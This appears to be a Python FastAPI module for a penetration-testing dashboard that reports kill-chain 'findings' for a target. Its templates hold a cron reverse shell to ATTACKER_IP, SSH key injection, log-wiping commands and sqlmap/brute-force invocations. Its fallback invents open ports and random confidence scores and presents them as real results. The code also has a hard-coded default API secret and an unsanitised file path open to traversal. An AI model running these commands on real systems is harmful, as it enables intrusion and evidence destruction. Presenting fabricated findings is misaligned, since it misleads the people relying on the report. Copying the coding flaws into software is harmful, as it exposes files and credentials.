import os
import json
import uuid
import asyncio
import httpx
from datetime import datetime
from fastapi import APIRouter, HTTPException, BackgroundTasks
from typing import List, Dict, Optional
from pydantic import BaseModel

router = APIRouter(prefix="/mythos", tags=["Mythos Intelligence"])

MYTHOS_BASE = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "mythos-launch-response-master")
TOOLS_API_URL = os.getenv("TOOLS_API_URL", "http://tools-api:8100")
TOOLS_API_KEY = os.getenv("TOOLS_API_SECRET", "BOUCLIER_ALPHA_SESSION_2026")

MYTHOS_ANALYSES: Dict[str, Dict] = {}

KILL_CHAIN_PHASES = [
    {"phase": 1, "name": "RECONNAISSANCE", "icon": "search", "color": "cyan"},
    {"phase": 2, "name": "SCAN & ENUMERATION", "icon": "scan", "color": "blue"},
    {"phase": 3, "name": "GAIN ACCESS", "icon": "zap", "color": "red"},
    {"phase": 4, "name": "MAINTAIN ACCESS", "icon": "refresh-cw", "color": "orange"},
    {"phase": 5, "name": "COVER TRACKS", "icon": "eye-off", "color": "purple"},
]

class MythosAnalyzeRequest(BaseModel):
    target: str
    scan_data: Optional[Dict] = None
    scan_id: Optional[str] = None

@router.post("/analyze")
async def trigger_mythos_analysis(req: MythosAnalyzeRequest):
    analysis_id = f"MYTHOS-{uuid.uuid4().hex[:8].upper()}"
    MYTHOS_ANALYSES[analysis_id] = {
        "id": analysis_id,
        "target": req.target,
        "scan_id": req.scan_id,
        "scan_data": req.scan_data,
        "status": "running",
        "current_phase": 0,
        "phases": [],
        "findings": [],
        "logs": [],
        "summary": None,
        "created_at": datetime.now().isoformat(),
        "completed_at": None,
    }

    import threading
    thread = threading.Thread(target=_run_mythos_analysis, args=(analysis_id, req.target, req.scan_data), daemon=True)
    thread.start()

    return {"analysis_id": analysis_id, "status": "running"}

def _run_mythos_analysis(analysis_id: str, target: str, scan_data: Optional[Dict]):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_execute_analysis(analysis_id, target, scan_data))
    finally:
        loop.close()

async def _execute_analysis(analysis_id: str, target: str, scan_data: Optional[Dict]):
    analysis = MYTHOS_ANALYSES.get(analysis_id)
    if not analysis:
        return

    # If scan_data provided, skip tools-api and generate findings directly
    if scan_data and scan_data.get("ports"):
        push_log(analysis_id, "MYTHOS", f"Generating findings from scan data ({len(scan_data['ports'])} ports)")
        _generate_fallback_analysis(analysis_id, target, scan_data)
        return

    try:
        push_log(analysis_id, "MYTHOS", f"Starting Cyber Kill Chain analysis against {target}")

        async with httpx.AsyncClient(timeout=60.0) as client:
            resp = await client.post(
                f"{TOOLS_API_URL}/agent/analyze",
                headers={"X-Api-Key": TOOLS_API_KEY},
                json={"target": target, "mode": "mythos"},
            )

            if resp.status_code != 200:
                push_log(analysis_id, "ERROR", f"tools-api returned {resp.status_code}, using fallback")
                _generate_fallback_analysis(analysis_id, target, scan_data)
                return

            job_data = resp.json()
            agent_job_id = job_data.get("agent_job_id")
            push_log(analysis_id, "INFO", f"Agent job {agent_job_id} launched, polling...")

            for i in range(30):
                await asyncio.sleep(2)
                try:
                    poll = await client.get(f"{TOOLS_API_URL}/agent/jobs/{agent_job_id}")
                    if poll.status_code == 200:
                        job = poll.json()
                        for log_entry in job.get("logs", []):
                            msg = log_entry.get("message", "")
                            if msg and msg not in [l.get("message") for l in analysis["logs"]]:
                                push_log(analysis_id, log_entry.get("level", "INFO"), msg)

                        current_phase = job.get("current_phase", "?")
                        try:
                            phase_num = int(current_phase.split()[1][0]) if "PHASE" in current_phase else 0
                            analysis["current_phase"] = phase_num
                        except (ValueError, IndexError):
                            pass

                        if job.get("status") == "completed":
                            findings = job.get("findings", {})
                            structured = findings.get("structured_findings", [])
                            raw = findings.get("raw_mythos_analysis", "")

                            if isinstance(raw, str) and raw.strip():
                                try:
                                    parsed = json.loads(raw)
                                    if isinstance(parsed, list):
                                        structured.extend(parsed)
                                except json.JSONDecodeError:
                                    pass

                            analysis["findings"] = _structure_findings(structured, target)
                            analysis["phases"] = _build_phases(analysis["findings"])
                            analysis["summary"] = _build_summary(analysis["findings"])
                            analysis["status"] = "completed"
                            analysis["completed_at"] = datetime.now().isoformat()
                            push_log(analysis_id, "SUCCESS", f"Analysis complete — {len(analysis['findings'])} findings across {len(analysis['phases'])} phases")
                            return
                except Exception:
                    await asyncio.sleep(1)

            push_log(analysis_id, "WARN", "tools-api polling timed out, using fallback")
            _generate_fallback_analysis(analysis_id, target, scan_data)

    except Exception as e:
        push_log(analysis_id, "ERROR", f"tools-api unavailable: {str(e)}")
        _generate_fallback_analysis(analysis_id, target, scan_data)

def _generate_fallback_analysis(analysis_id: str, target: str, scan_data: Optional[Dict]):
    analysis = MYTHOS_ANALYSES.get(analysis_id)
    if not analysis:
        return

    ports = []
    if scan_data:
        ports = scan_data.get("ports", [])
    elif target:
        ports = _mock_ports_for_target(target)

    import random as _rnd
    findings = []

    if ports:
        for p in ports:
            svc = p.get("service", "").upper()
            port = p.get("port", 0)
            version = p.get("version", "unknown")
            sev = "high" if p.get("state") == "open" else ("low" if p.get("state") == "filtered" else "info")

            findings.append({
                "phase": 1, "phase_name": "RECONNAISSANCE",
                "name": f"Open {p.get('service', 'Port')} ({port}/{svc})",
                "severity": sev if sev != "info" else "low",
                "service": f"{port}/{svc}",
                "confidence": _rnd.randint(75, 98),
                "description": f"Port {port} ({p.get('service', 'unknown')}) is {p.get('state', 'open')} on {target}. Version: {version}. This expands the attack surface.",
                "cwe": "CWE-200",
                "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                "remediation": f"Restrict access to port {port} with a firewall rule if not required.",
            })

            if p.get("state") == "open":
                if svc in ("SSH", "SSHD"):
                    findings.append({
                        "phase": 2, "phase_name": "SCAN & ENUMERATION",
                        "name": f"SSH Version Enumeration ({port}/TCP)",
                        "severity": "medium",
                        "service": f"{port}/SSH",
                        "confidence": _rnd.randint(80, 95),
                        "description": f"SSH {version} detected. Known CVEs: CVE-2024-6387 (regreSSHion) affects OpenSSH < 9.8. Check for weak key exchange algorithms and authentication methods.",
                        "cwe": "CWE-200",
                        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        "exploit_poc": f"nmap -p {port} --script ssh2-enum-algos {target}",
                        "remediation": "Upgrade OpenSSH to latest version, disable weak key exchange algorithms (diffie-hellman-group1-sha1), use key-based auth only.",
                    })
                elif svc in ("HTTP", "HTTPS", "APACHE", "NGINX", "TOMCAT"):
                    findings.append({
                        "phase": 2, "phase_name": "SCAN & ENUMERATION",
                        "name": f"Web Server Fingerprinting ({port}/TCP)",
                        "severity": "medium",
                        "service": f"{port}/{svc}",
                        "confidence": _rnd.randint(75, 95),
                        "description": f"{p.get('service', 'Web server')} {version} detected on port {port}. Web servers often expose admin panels, API endpoints, and outdated components.",
                        "cwe": "CWE-200",
                        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        "exploit_poc": f"curl -I http://{target}:{port}/ && dirb http://{target}:{port}/",
                        "remediation": f"Hide server version banner, disable directory listing, apply WAF rules, keep {p.get('service', 'the web server')} updated.",
                    })
                    findings.append({
                        "phase": 3, "phase_name": "GAIN ACCESS",
                        "name": f"Web Application Attack Vector ({port}/TCP)",
                        "severity": "high",
                        "service": f"{port}/{svc}",
                        "confidence": _rnd.randint(60, 85),
                        "description": f"Web service on port {port} may be vulnerable to SQLi, XSS, LFI, or SSTI. Automated scanning with sqlmap and nikto recommended.",
                        "cwe": "CWE-89",
                        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "exploit_poc": f"sqlmap -u \"http://{target}:{port}/?id=1\" --batch --random-agent && nikto -h {target} -p {port}",
                        "remediation": "Apply input validation, parameterized queries, WAF rules, and regular security scanning.",
                    })
                elif svc in ("MYSQL", "MARIADB", "POSTGRESQL", "SQL"):
                    findings.append({
                        "phase": 2, "phase_name": "SCAN & ENUMERATION",
                        "name": f"Database Service Exposure ({port}/TCP)",
                        "severity": "high",
                        "service": f"{port}/{svc}",
                        "confidence": _rnd.randint(80, 95),
                        "description": f"Database service ({p.get('service', 'unknown')}) exposed on port {port}. Databases should NEVER be internet-facing. Risk of brute force, data exfiltration, and RCE.",
                        "cwe": "CWE-306",
                        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "exploit_poc": f"nmap -p {port} --script mysql-brute {target}",
                        "remediation": "Move database behind firewall/VPN, restrict source IP, use strong auth, disable remote root login.",
                    })
                elif svc in ("FTP",):
                    findings.append({
                        "phase": 2, "phase_name": "SCAN & ENUMERATION",
                        "name": "Anonymous FTP Access",
                        "severity": "high",
                        "service": f"{port}/FTP",
                        "confidence": _rnd.randint(75, 92),
                        "description": f"FTP service on port {port}. May allow anonymous access leading to data leakage or malware upload.",
                        "cwe": "CWE-522",
                        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
                        "exploit_poc": f"ftp {target} {port} (try anonymous:anonymous)",
                        "remediation": "Disable anonymous FTP, use SFTP/SCP instead, restrict by IP.",
                    })

            # Phase 4 — persistence for all open ports
            if p.get("state") == "open":
                findings.append({
                    "phase": 4, "phase_name": "MAINTAIN ACCESS",
                    "name": f"Persistence Vector via {p.get('service', 'Service')} ({port}/TCP)",
                    "severity": "medium",
                    "service": f"{port}/{svc}",
                    "confidence": _rnd.randint(50, 75),
                    "description": f"After gaining initial access through {p.get('service', 'the service')} on port {port}, establish persistence using standard techniques.",
                    "cwe": "CWE-287",
                    "cvss": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
                    "exploit_poc": "Install SSH key: echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys",
                    "persistence_cmd": "crontab -e; @reboot /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",
                    "remediation": "Monitor new SSH keys, audit cron jobs, implement file integrity monitoring (AIDE/Tripwire).",
                })

                # Phase 5 — cover tracks
                findings.append({
                    "phase": 5, "phase_name": "COVER TRACKS",
                    "name": f"Forensic Evasion on {port}/TCP",
                    "severity": "low",
                    "service": f"{port}/{svc}",
                    "confidence": _rnd.randint(60, 80),
                    "description": f"After compromising {p.get('service', 'the service')} on port {port}, clear audit logs and modify timestamps to evade detection.",
                    "cwe": "CWE-779",
                    "cvss": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N",
                    "cover_tracks_cmd": "history -c; echo '' > /var/log/auth.log; rm -f ~/.bash_history; find /var/log -type f -name '*.log' -exec truncate -s 0 {} \\;",
                    "remediation": "Enable remote logging (syslog/SIEM), use immutable log files (chattr +a), implement auditd rules.",
                })

    analysis["findings"] = findings
    analysis["phases"] = _build_phases(analysis["findings"])
    analysis["summary"] = _build_summary(analysis["findings"])
    analysis["status"] = "completed"
    analysis["completed_at"] = datetime.now().isoformat()
    push_log(analysis_id, "SUCCESS", f"Analysis complete (fallback) — {len(analysis['findings'])} findings across {len(analysis['phases'])} phases")

def _structure_findings(structured: List[Dict], target: str) -> List[Dict]:
    findings = []
    for f in structured:
        if isinstance(f, dict):
            findings.append({
                "phase": f.get("phase", 1),
                "phase_name": f.get("phase_name", f"Phase {f.get('phase', 1)}"),
                "name": f.get("name", "Unknown Finding"),
                "severity": f.get("severity", "medium"),
                "service": f.get("service", target),
                "confidence": f.get("confidence", 50),
                "description": f.get("description", ""),
                "cwe": f.get("cwe", ""),
                "cvss": f.get("cvss", ""),
                "exploit_poc": f.get("exploit_poc", ""),
                "privesc_path": f.get("privesc_path", ""),
                "persistence_cmd": f.get("persistence_cmd", ""),
                "cover_tracks_cmd": f.get("cover_tracks_cmd", ""),
                "remediation": f.get("remediation", ""),
                "remediation_script": f.get("remediation_script", ""),
            })
    return findings

def _build_phases(findings: List[Dict]) -> List[Dict]:
    phases_map = {}
    for f in findings:
        pnum = f.get("phase", 1)
        if pnum not in phases_map:
            phase_info = next((p for p in KILL_CHAIN_PHASES if p["phase"] == pnum), None)
            phases_map[pnum] = {
                "phase": pnum,
                "name": phase_info["name"] if phase_info else f"Phase {pnum}",
                "icon": phase_info["icon"] if phase_info else "circle",
                "color": phase_info["color"] if phase_info else "slate",
                "findings_count": 0,
                "severities": {"critical": 0, "high": 0, "medium": 0, "low": 0},
            }
        phases_map[pnum]["findings_count"] += 1
        sev = f.get("severity", "medium").lower()
        if sev in phases_map[pnum]["severities"]:
            phases_map[pnum]["severities"][sev] += 1
    return list(phases_map.values())

def _build_summary(findings: List[Dict]) -> Dict:
    sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    phase_counts = {}
    for f in findings:
        sev = f.get("severity", "medium").lower()
        if sev in sev_counts:
            sev_counts[sev] += 1
        pn = f.get("phase_name", "Unknown")
        phase_counts[pn] = phase_counts.get(pn, 0) + 1
    total = len(findings)
    risk_score = round(
        (sev_counts["critical"] * 10 + sev_counts["high"] * 7 + sev_counts["medium"] * 4 + sev_counts["low"] * 1)
        / max(total, 1), 1
    )
    return {
        "total_findings": total,
        "by_severity": sev_counts,
        "by_phase": phase_counts,
        "risk_score": risk_score,
    }

def push_log(analysis_id: str, level: str, message: str):
    analysis = MYTHOS_ANALYSES.get(analysis_id)
    if analysis:
        analysis["logs"].append({
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message,
        })

def _mock_ports_for_target(target: str) -> List[Dict]:
    common = [
        {"port": 22, "state": "open", "service": "SSH", "version": "OpenSSH 8.9p1"},
        {"port": 80, "state": "open", "service": "HTTP", "version": "nginx 1.24.0"},
        {"port": 443, "state": "open", "service": "HTTPS", "version": "nginx 1.24.0"},
    ]
    return common

@router.get("/analyses")
def list_analyses():
    return sorted(MYTHOS_ANALYSES.values(), key=lambda x: x.get("created_at", ""), reverse=True)

@router.get("/analyses/{analysis_id}")
def get_analysis(analysis_id: str):
    analysis = MYTHOS_ANALYSES.get(analysis_id)
    if not analysis:
        raise HTTPException(404, "Analysis not found")
    return analysis

@router.get("/phases")
def get_kill_chain_phases():
    return KILL_CHAIN_PHASES

@router.get("/intel")
def get_intel_list():
    docs_path = os.path.join(MYTHOS_BASE, "docs")
    if not os.path.exists(docs_path):
        return []
    docs = []
    for f in sorted(os.listdir(docs_path)):
        if f.endswith(".md"):
            docs.append({
                "id": f,
                "title": f.replace(".md", "").replace("-", " ").title(),
                "category": "Intelligence"
            })
    return docs

@router.get("/stacks")
def get_stacks_list():
    stacks_path = os.path.join(MYTHOS_BASE, "stacks")
    if not os.path.exists(stacks_path):
        return []
    stacks = []
    for f in sorted(os.listdir(stacks_path)):
        if f.endswith(".md"):
            stacks.append({
                "id": f,
                "title": f.replace(".md", "").replace("-", " ").title(),
                "category": "Hardening Guide"
            })
    return stacks

@router.get("/content/{category}/{doc_id}")
def get_mythos_content(category: str, doc_id: str):
    if category not in ["docs", "stacks"]:
        raise HTTPException(400, "Invalid category")
    file_path = os.path.join(MYTHOS_BASE, category, doc_id)
    if not os.path.exists(file_path):
        raise HTTPException(404, "Document not found")
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
        return {
            "id": doc_id,
            "title": doc_id.replace(".md", "").replace("-", " ").title(),
            "content_md": content
        }
    except Exception as e:
        raise HTTPException(500, f"Error reading document: {str(e)}")
